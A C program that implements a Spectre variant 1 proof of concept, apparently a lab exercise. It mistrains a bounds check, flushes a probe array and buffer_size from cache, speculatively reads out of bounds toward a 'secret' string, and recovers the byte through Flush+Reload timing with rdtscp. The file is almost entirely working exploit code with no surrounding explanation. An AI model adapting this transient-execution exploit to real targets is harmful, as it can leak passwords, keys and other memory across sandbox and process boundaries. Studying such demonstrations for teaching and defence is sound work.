#include <x86intrin.h>
#include <stdio.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t array[256 * 4096];
uint8_t temp = 0;
char *secret = "St. Louis County recorded a total of 4,159 violent crimes in 2021!";

/* Sandbox Function */
uint8_t restrictedAccess(size_t x)
{
    if (x < buffer_size) {
        return buffer[x];
    } else {
        return 0;
    }
}

void flushSideChannel()
{
    int i;

    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void reloadSideChannel()
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
            printf("The secret is %d.\n", i);
        }
    }
}

void spectreAttack(size_t larger_x)
{
    int i;
    uint8_t s;

    /* Train the CPU to take the true branch inside sandbox function */
    for (i = 0; i < 10; i++) {
        restrictedAccess(i);
    }

    /* Flush buffer_size and array[] from the cache */
    _mm_clflush(&buffer_size);
    for (i = 0; i < 256; i++) {
        _mm_clflush(&array[i * 4096 + DELTA]);
    }
    // for (i = 0; i < 100; i++) { }

    s = restrictedAccess(larger_x); /* Only zero should be returned */
    array[s * 4096 + DELTA] += 88;  /* However the cache is not cleaned */
}

int main()
{
    flushSideChannel();

    size_t larger_x = (size_t)(secret - (char *)buffer);    /* Offset of the secret from the beginning of the buffer */
    spectreAttack(larger_x);
    
    reloadSideChannel();

    return 0;
}
